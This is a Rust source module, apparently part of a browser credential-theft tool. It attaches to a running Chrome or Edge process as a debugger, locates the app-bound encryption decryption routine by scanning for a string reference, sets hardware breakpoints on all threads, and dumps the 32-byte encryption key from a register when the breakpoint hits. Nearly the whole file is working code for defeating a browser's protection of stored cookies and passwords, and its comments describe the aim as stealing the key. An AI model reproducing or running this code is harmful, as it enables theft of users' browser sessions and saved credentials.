use std::mem::zeroed;

use windows::Win32::Foundation::{
    CloseHandle, DBG_CONTINUE, EXCEPTION_SINGLE_STEP, HANDLE,
};
use windows::Win32::System::Diagnostics::Debug::{
    ContinueDebugEvent, GetThreadContext, SetThreadContext, WaitForDebugEvent, CONTEXT,
    CONTEXT_CONTROL_AMD64, CONTEXT_DEBUG_REGISTERS_AMD64, CONTEXT_INTEGER_AMD64,
    CREATE_THREAD_DEBUG_EVENT, DEBUG_EVENT, EXCEPTION_DEBUG_EVENT, EXIT_PROCESS_DEBUG_EVENT,
    LOAD_DLL_DEBUG_EVENT, LOAD_DLL_DEBUG_INFO,
};
use windows::Win32::System::Threading::{OpenThread, ResumeThread, SuspendThread, THREAD_ALL_ACCESS};

use crate::mem;
use crate::pe;
use crate::process;

/// The browser's own ABE code references this static string right where it
/// returns the decrypted key; we locate the reference from .rdata via an XREF
/// scan, exactly like the original tool.
const DECRYPT_RESULT_CODE: &[u8] = b"OSCrypt.AppBoundProvider.Decrypt.ResultCode\x00";
const KEY_LEN: usize = 32;
const DEBUG_EVENT_WAIT_MS: u32 = 500;

fn set_hw_breakpoint(hthread: HANDLE, addr: usize, clear: bool) -> bool {
    let mut ctx: CONTEXT = unsafe { zeroed() };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
    if unsafe { GetThreadContext(hthread, &mut ctx) }.is_err() {
        eprintln!("[-] GetThreadContext failed");
        return false;
    }
    if clear {
        ctx.Dr0 = 0;
        ctx.Dr6 = 0;
        ctx.Dr7 = 0;
    } else {
        // Execution breakpoint in debug register slot 0 (Dr0), local enable.
        ctx.Dr0 = addr as u64;
        ctx.Dr7 = 0;
        ctx.Dr7 |= 1;
        ctx.Dr6 = 0;
    }
    unsafe { SetThreadContext(hthread, &ctx) }.is_ok()
}

fn arm_thread(hthread: HANDLE, addr: usize, clear: bool) {
    if unsafe { SuspendThread(hthread) } == u32::MAX {
        eprintln!("[-] SuspendThread failed");
        return;
    }
    set_hw_breakpoint(hthread, addr, clear);
    unsafe { ResumeThread(hthread) };
}

fn arm_all_threads(pid: u32, addr: usize, clear: bool) -> usize {
    let mut armed = 0;
    for tid in process::threads_of(pid) {
        if let Ok(hthread) = unsafe { OpenThread(THREAD_ALL_ACCESS, false, tid) } {
            arm_thread(hthread, addr, clear);
            armed += 1;
            unsafe { let _ = CloseHandle(hthread); };
        }
    }
    armed
}

fn dll_name(hprocess: HANDLE, load: &LOAD_DLL_DEBUG_INFO) -> Option<String> {
    if load.lpImageName.is_null() {
        return None;
    }
    // lpImageName points at a pointer inside the target's address space.
    let string_ptr: usize = mem::read_value(hprocess, load.lpImageName as usize)?;
    if string_ptr == 0 {
        return None;
    }
    let raw = mem::read_bytes(hprocess, string_ptr, 2048)?;
    let full = if load.fUnicode != 0 {
        let wide: Vec<u16> = raw
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        let end = wide.iter().position(|&c| c == 0).unwrap_or(wide.len());
        String::from_utf16_lossy(&wide[..end])
    } else {
        let end = raw.iter().position(|&b| b == 0).unwrap_or(raw.len());
        String::from_utf8_lossy(&raw[..end]).to_string()
    };
    Some(full.rsplit(['\\', '/']).next().unwrap_or(&full).to_string())
}

fn dump_key(hprocess: HANDLE, tid: u32, edge: bool) -> Option<[u8; KEY_LEN]> {
    let hthread = unsafe { OpenThread(THREAD_ALL_ACCESS, false, tid) }.ok()?;
    let mut ctx: CONTEXT = unsafe { zeroed() };
    ctx.ContextFlags = CONTEXT_INTEGER_AMD64 | CONTEXT_CONTROL_AMD64;
    unsafe { GetThreadContext(hthread, &mut ctx) }.ok()?;
    println!(
        "[+] Hardware breakpoint hit on thread {tid}, RIP = {:#x}",
        ctx.Rip
    );
    unsafe { let _ = CloseHandle(hthread); };

    // Chrome keeps the key pointer in R15 at this point, Edge in R14.
    let (reg_name, key_ptr_reg) = if edge { ("R14", ctx.R14) } else { ("R15", ctx.R15) };
    if key_ptr_reg == 0 {
        eprintln!("[-] {reg_name} was empty");
        return None;
    }
    println!("[*] Dumping key from {reg_name}");

    let key_ptr: usize = mem::read_value(hprocess, key_ptr_reg as usize)?;
    println!("[*] Encryption key will be at {key_ptr:#x}");
    let key_bytes = mem::read_bytes(hprocess, key_ptr, KEY_LEN)?;
    let key: [u8; KEY_LEN] = key_bytes.as_slice().try_into().ok()?;
    Some(key)
}

fn locate_breakpoint(hprocess: HANDLE, base: usize) -> Option<usize> {
    let string_va = pe::find_pattern(hprocess, base, DECRYPT_RESULT_CODE)?;
    pe::find_lea_xref(hprocess, base, string_va)
}

/// Attach as the debugger (the caller already did DebugActiveProcess) and wait
/// until the browser returns from its own app-bound decryption, then steal
/// the key from the register that holds the key pointer.
pub fn run(hprocess: HANDLE, pid: u32, target_module: &str, edge: bool) -> Option<[u8; KEY_LEN]> {
    let mut breakpoint: Option<usize> = None;
    let mut event: DEBUG_EVENT = unsafe { zeroed() };

    loop {
        if unsafe { WaitForDebugEvent(&mut event, DEBUG_EVENT_WAIT_MS) }.is_err() {
            // The debuggee went quiet: startup finished without a hit.
            if let Some(bp) = breakpoint {
                // Detaching with breakpoints still armed would crash it.
                arm_all_threads(pid, bp, true);
            }
            break;
        }

        let tid = event.dwThreadId;
        let ev_pid = event.dwProcessId;

        match event.dwDebugEventCode {
            EXCEPTION_DEBUG_EVENT => {
                let info = unsafe { event.u.Exception };
                let code = info.ExceptionRecord.ExceptionCode;
                // Only trust single-step exceptions from our own debuggee
                // (child processes report debug events to us as well).
                if ev_pid == pid && code == EXCEPTION_SINGLE_STEP && breakpoint.is_some() {
                    let bp = breakpoint?;
                    let key = dump_key(hprocess, tid, edge);
                    arm_all_threads(pid, bp, true); // clear hardware breakpoints
                    unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
                    return key;
                }
            }
            CREATE_THREAD_DEBUG_EVENT => {
                if breakpoint.is_some() && ev_pid == pid {
                    if let Ok(hthread) = unsafe { OpenThread(THREAD_ALL_ACCESS, false, tid) } {
                        arm_thread(hthread, breakpoint?, false);
                        unsafe { let _ = CloseHandle(hthread); };
                    }
                }
            }
            LOAD_DLL_DEBUG_EVENT => {
                if breakpoint.is_none() && ev_pid == pid {
                    let load = unsafe { event.u.LoadDll };
                    if let Some(name) = dll_name(hprocess, &load) {
                        if name.eq_ignore_ascii_case(target_module) {
                            let base = load.lpBaseOfDll as usize;
                            println!("[*] {target_module} loaded at {base:#x}");
                            match locate_breakpoint(hprocess, base) {
                                Some(bp) => {
                                    let armed = arm_all_threads(pid, bp, false);
                                    println!("[*] Hardware breakpoint armed on {armed} threads");
                                    breakpoint = Some(bp);
                                }
                                None => eprintln!(
                                    "[-] Failed to locate the decryption routine; cannot continue"
                                ),
                            }
                        }
                    }
                }
            }
            EXIT_PROCESS_DEBUG_EVENT => {
                println!("[+] The debuggee exited before the key was captured");
                unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
                return None;
            }
            _ => {}
        }
        unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
    }
    None
}
